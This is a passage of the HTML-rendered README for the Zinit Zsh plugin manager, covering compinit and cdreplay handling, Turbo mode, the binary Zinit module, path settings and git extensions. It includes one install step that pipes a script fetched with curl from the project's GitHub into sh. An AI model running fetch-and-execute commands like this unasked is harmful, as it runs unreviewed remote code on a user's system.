                         &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; completion-definition for later possible re-run with `zinit&lt;/span&gt;
                         &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; cdreplay' or `zicdreplay' (the second one can be used in hooks&lt;/span&gt;
                         &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; like atload'', atinit'', etc.)&lt;/span&gt;
...
zinit load &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;other/plugin&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;

autoload -Uz compinit
compinit

zinit cdreplay -q   &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; -q is for quiet; actually run all the `compdef's saved before&lt;/span&gt;
                    &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt;`compinit` call (`compinit' declares the `compdef' function, so&lt;/span&gt;
                    &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; it cannot be used until `compinit' is ran; Zinit solves this&lt;/span&gt;
                    &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; via intercepting the `compdef'-calls and storing them for later&lt;/span&gt;
                    &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; use with `zinit cdreplay')&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This allows to call compinit once.
Performance gains are huge, example shell startup time with double &lt;code&gt;compinit&lt;/code&gt;: &lt;strong&gt;0.980&lt;/strong&gt; sec, with
&lt;code&gt;cdreplay&lt;/code&gt; and single &lt;code&gt;compinit&lt;/code&gt;: &lt;strong&gt;0.156&lt;/strong&gt; sec.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-calling-compinit-with-turbo-mode" class="anchor" aria-hidden="true" href="#calling-compinit-with-turbo-mode"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Calling &lt;code&gt;compinit&lt;/code&gt; With Turbo Mode&lt;/h2&gt;
&lt;p&gt;If you load completions using &lt;code&gt;wait''&lt;/code&gt; Turbo mode then you can add
&lt;code&gt;atinit'zicompinit'&lt;/code&gt; to syntax-highlighting plugin (which should be the last
one loaded, as their (2 projects, &lt;a href="https://github.com/zsh-users/zsh-syntax-highlighting"&gt;z-sy-h&lt;/a&gt; &amp;amp;
&lt;a href="https://github.com/zdharma/fast-syntax-highlighting"&gt;f-sy-h&lt;/a&gt;)
documentation state), or &lt;code&gt;atload'zicompinit'&lt;/code&gt; to last
completion-related plugin. &lt;code&gt;zicompinit&lt;/code&gt; is a function that just runs &lt;code&gt;autoload compinit; compinit&lt;/code&gt;, created for convenience. There's also &lt;code&gt;zicdreplay&lt;/code&gt; which
will replay any caught compdefs so you can also do: &lt;code&gt;atinit'zicompinit; zicdreplay'&lt;/code&gt;, etc. Basically, the whole topic is the same as normal &lt;code&gt;compinit&lt;/code&gt; call,
but it is done in &lt;code&gt;atinit&lt;/code&gt; or &lt;code&gt;atload&lt;/code&gt; hook of the last related plugin with use of the
helper functions (&lt;code&gt;zicompinit&lt;/code&gt;,&lt;code&gt;zicdreplay&lt;/code&gt; &amp;amp; &lt;code&gt;zicdclear&lt;/code&gt; – see below for explanation
of the last one). To summarize:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c1"&gt;source&lt;/span&gt; &lt;span class="pl-k"&gt;~&lt;/span&gt;/.zinit/bin/zinit.zsh

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Load using the for-syntax&lt;/span&gt;
zinit &lt;span class="pl-c1"&gt;wait&lt;/span&gt; lucid &lt;span class="pl-k"&gt;for&lt;/span&gt; \
    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;some/plugin&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit &lt;span class="pl-c1"&gt;wait&lt;/span&gt; lucid &lt;span class="pl-k"&gt;for&lt;/span&gt; \
    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;other/plugin&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;

zinit &lt;span class="pl-c1"&gt;wait&lt;/span&gt; lucid atload&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;zicompinit; zicdreplay&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; blockf &lt;span class="pl-k"&gt;for&lt;/span&gt; \
    zsh-users/zsh-completions&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;a id="user-content-ignoring-compdefs" class="anchor" aria-hidden="true" href="#ignoring-compdefs"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Ignoring Compdefs&lt;/h2&gt;
&lt;p&gt;If you want to ignore compdefs provided by some plugins or snippets, place their load commands
before commands loading other plugins or snippets, and issue &lt;code&gt;zinit cdclear&lt;/code&gt; (or
&lt;code&gt;zicdclear&lt;/code&gt;, designed to be used in hooks like &lt;code&gt;atload''&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight highlight-source-systemverilog"&gt;&lt;pre&gt;source &lt;span class="pl-k"&gt;~&lt;/span&gt;&lt;span class="pl-k"&gt;/&lt;/span&gt;.zinit&lt;span class="pl-k"&gt;/&lt;/span&gt;bin&lt;span class="pl-k"&gt;/&lt;/span&gt;zinit.zsh
zinit snippet &lt;span class="pl-c1"&gt;OMZ&lt;/span&gt;&lt;span class="pl-k"&gt;::&lt;/span&gt;plugins&lt;span class="pl-k"&gt;/&lt;/span&gt;git&lt;span class="pl-k"&gt;/&lt;/span&gt;git.plugin.zsh
zinit cdclear &lt;span class="pl-k"&gt;-&lt;/span&gt;q &lt;span class="pl-k"&gt;#&lt;/span&gt; &lt;span class="pl-k"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-k"&gt;-&lt;/span&gt; forget completions provided by &lt;span class="pl-k"&gt;Git&lt;/span&gt; &lt;span class="pl-en"&gt;plugin&lt;/span&gt;

zinit load &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;some/plugin&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
...
zinit load &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;other/plugin&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;

autoload &lt;span class="pl-k"&gt;-&lt;/span&gt;Uz compinit
compinit
zinit cdreplay &lt;span class="pl-k"&gt;-&lt;/span&gt;q &lt;span class="pl-k"&gt;#&lt;/span&gt; &lt;span class="pl-k"&gt;&amp;lt;&lt;/span&gt;&lt;span class="pl-k"&gt;-&lt;/span&gt; execute compdefs provided by rest of plugins
zinit cdlist &lt;span class="pl-k"&gt;#&lt;/span&gt; look at gathered compdefs&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;cdreplay&lt;/code&gt; is important if you use plugins like
&lt;code&gt;OMZ::plugins/kubectl/kubectl.plugin.zsh&lt;/code&gt; or &lt;code&gt;asdf-vm/asdf&lt;/code&gt;, because those plugins call
&lt;code&gt;compdef&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-disabling-system-wide-compinit-call-ubuntu" class="anchor" aria-hidden="true" href="#disabling-system-wide-compinit-call-ubuntu"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disabling System-Wide &lt;code&gt;compinit&lt;/code&gt; Call (Ubuntu)&lt;/h2&gt;
&lt;p&gt;On Ubuntu users might get surprised that e.g. their completions work while they didn't
call &lt;code&gt;compinit&lt;/code&gt; in their &lt;code&gt;.zshrc&lt;/code&gt;. That's because the function is being called in
&lt;code&gt;/etc/zshrc&lt;/code&gt;. To disable this call – what is needed to avoid the slowdown and if user
loads any completion-equipped plugins, i.e. almost on 100% – add the following lines to
&lt;code&gt;~/.zshenv&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Skip the not really helping Ubuntu global compinit&lt;/span&gt;
skip_global_compinit=1&lt;/pre&gt;&lt;/div&gt;
&lt;h1&gt;&lt;a id="user-content-zinit-module" class="anchor" aria-hidden="true" href="#zinit-module"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Zinit Module&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-motivation" class="anchor" aria-hidden="true" href="#motivation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Motivation&lt;/h2&gt;
&lt;p&gt;The module is a binary Zsh module (think about &lt;code&gt;zmodload&lt;/code&gt; Zsh command, it's that topic) which transparently and
automatically &lt;strong&gt;compiles sourced scripts&lt;/strong&gt;. Many plugin managers do not offer compilation of plugins, the module is
a solution to this. Even if a plugin manager does compile plugin's main script (like Zinit does), the script can
source smaller helper scripts or dependency libraries (for example, the prompt &lt;code&gt;geometry-zsh/geometry&lt;/code&gt; does that)
and there are very few solutions to that, which are demanding (e.g. specifying all helper files in plugin load
command and tracking updates to the plugin – in Zinit case: by using &lt;code&gt;compile&lt;/code&gt; ice-mod).&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://raw.githubusercontent.com/zdharma/zinit/images/mod-auto-compile.png"&gt;&lt;img src="https://raw.githubusercontent.com/zdharma/zinit/images/mod-auto-compile.png" alt="image" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-installation-1" class="anchor" aria-hidden="true" href="#installation-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installation&lt;/h2&gt;
&lt;h3&gt;&lt;a id="user-content-without-zinit" class="anchor" aria-hidden="true" href="#without-zinit"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Without Zinit&lt;/h3&gt;
&lt;p&gt;To install just the binary Zinit module &lt;strong&gt;standalone&lt;/strong&gt; (Zinit is not needed, the module can be used with any
other plugin manager), execute:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;sh -c &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;$(&lt;/span&gt;curl -fsSL https://raw.githubusercontent.com/zdharma/zinit/master/doc/mod-install.sh&lt;span class="pl-pds"&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This script will display what to add to &lt;code&gt;~/.zshrc&lt;/code&gt; (2 lines) and show usage instructions.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-with-zinit" class="anchor" aria-hidden="true" href="#with-zinit"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;With Zinit&lt;/h3&gt;
&lt;p&gt;Zinit users can build the module by issuing following command instead of running above &lt;code&gt;mod-install.sh&lt;/code&gt; script
(the script is for e.g. &lt;code&gt;zgen&lt;/code&gt; users or users of any other plugin manager):&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;zinit module build&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This command will compile the module and display instructions on what to add to &lt;code&gt;~/.zshrc&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-measuring-time-of-sources" class="anchor" aria-hidden="true" href="#measuring-time-of-sources"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Measuring Time of &lt;code&gt;source&lt;/code&gt;s&lt;/h2&gt;
&lt;p&gt;Besides the compilation-feature, the module also measures &lt;strong&gt;duration&lt;/strong&gt; of each script sourcing. Issue &lt;code&gt;zpmod source-study&lt;/code&gt; after loading the module at top of &lt;code&gt;~/.zshrc&lt;/code&gt; to see a list of all sourced files with the time the
sourcing took in milliseconds on the left. This feature allows to profile the shell startup. Also, no script can
pass-through that check and you will obtain a complete list of all loaded scripts, like if Zshell itself was
tracking this. The list can be surprising.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-debugging" class="anchor" aria-hidden="true" href="#debugging"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Debugging&lt;/h2&gt;
&lt;p&gt;To enable debug messages from the module set:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;typeset&lt;/span&gt; -g ZPLG_MOD_DEBUG=1&lt;/pre&gt;&lt;/div&gt;
&lt;h1&gt;&lt;a id="user-content-hints-and-tips" class="anchor" aria-hidden="true" href="#hints-and-tips"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Hints and Tips&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-customizing-paths" class="anchor" aria-hidden="true" href="#customizing-paths"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Customizing Paths&lt;/h2&gt;
&lt;p&gt;Following variables can be set to custom values, before sourcing Zinit. The
previous global variables like &lt;code&gt;$ZPLG_HOME&lt;/code&gt; have been removed to not pollute
the namespace – there's single &lt;code&gt;$ZINIT&lt;/code&gt; hash instead of &lt;code&gt;8&lt;/code&gt; string
variables. Please update your dotfiles.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;declare -A ZINIT  # initial Zinit's hash definition, if configuring before loading Zinit, and then:
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Hash Field&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ZINIT[BIN_DIR]&lt;/td&gt;
&lt;td&gt; Where Zinit code resides, e.g.: "~/.zinit/bin"&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ZINIT[HOME_DIR]&lt;/td&gt;
&lt;td&gt; Where Zinit should create all working directories, e.g.: "~/.zinit"&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ZINIT[PLUGINS_DIR]&lt;/td&gt;
&lt;td&gt;Override single working directory – for plugins, e.g. "/opt/zsh/zinit/plugins"&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ZINIT[COMPLETIONS_DIR]&lt;/td&gt;
&lt;td&gt;As above, but for completion files, e.g. "/opt/zsh/zinit/root_completions"&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ZINIT[SNIPPETS_DIR]&lt;/td&gt;
&lt;td&gt; As above, but for snippets&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ZINIT[ZCOMPDUMP_PATH]&lt;/td&gt;
&lt;td&gt;Path to &lt;code&gt;.zcompdump&lt;/code&gt; file, with the file included (i.e. its name can be different)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ZINIT[COMPINIT_OPTS]&lt;/td&gt;
&lt;td&gt;Options for &lt;code&gt;compinit&lt;/code&gt; call (i.e. done by &lt;code&gt;zicompinit&lt;/code&gt;), use to pass -C to speed up loading&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ZINIT[MUTE_WARNINGS]&lt;/td&gt;
&lt;td&gt;If set to &lt;code&gt;1&lt;/code&gt;, then mutes some of the Zinit warnings, specifically the &lt;code&gt;plugin already registered&lt;/code&gt; warning&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;There is also &lt;code&gt;$ZPFX&lt;/code&gt;, set by default to &lt;code&gt;~/.zinit/polaris&lt;/code&gt; – a directory
where software with &lt;code&gt;Makefile&lt;/code&gt;, etc. can be pointed to, by e.g. &lt;code&gt;atclone'./configure --prefix=$ZPFX'&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-non-github-local-plugins" class="anchor" aria-hidden="true" href="#non-github-local-plugins"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Non-GitHub (Local) Plugins&lt;/h2&gt;
&lt;p&gt;Use &lt;code&gt;create&lt;/code&gt; subcommand with user name &lt;code&gt;_local&lt;/code&gt; (the default) to create plugin's
skeleton in &lt;code&gt;$ZINIT[PLUGINS_DIR]&lt;/code&gt;. It will be not connected with GitHub repository
(because of user name being &lt;code&gt;_local&lt;/code&gt;). To enter the plugin's directory use &lt;code&gt;cd&lt;/code&gt; command
with just plugin's name (without &lt;code&gt;_local&lt;/code&gt;, it's optional).&lt;/p&gt;
&lt;p&gt;If user name will not be &lt;code&gt;_local&lt;/code&gt;, then Zinit will create repository also on GitHub
and setup correct repository origin.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-extending-git" class="anchor" aria-hidden="true" href="#extending-git"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Extending Git&lt;/h2&gt;
&lt;p&gt;There are several projects that provide git extensions. Installing them with
Zinit has many benefits:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;all files are under &lt;code&gt;$HOME&lt;/code&gt; – no administrator rights needed,&lt;/li&gt;
&lt;li&gt;declarative setup (like Chef or Puppet) – copying &lt;code&gt;.zshrc&lt;/code&gt; to different account
brings also git-related setup,&lt;/li&gt;
&lt;li&gt;easy update by e.g. &lt;code&gt;zinit update --all&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Below is a configuration that adds multiple git extensions, loaded in Turbo mode,
two seconds after prompt:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;zinit ice wait&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;2&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; lucid as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;program&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; pick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;bin/git-dsf&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit light zdharma/zsh-diff-so-fancy

zinit ice wait&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;2&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; lucid as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;program&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; pick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;git-now&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit light iwata/git-now

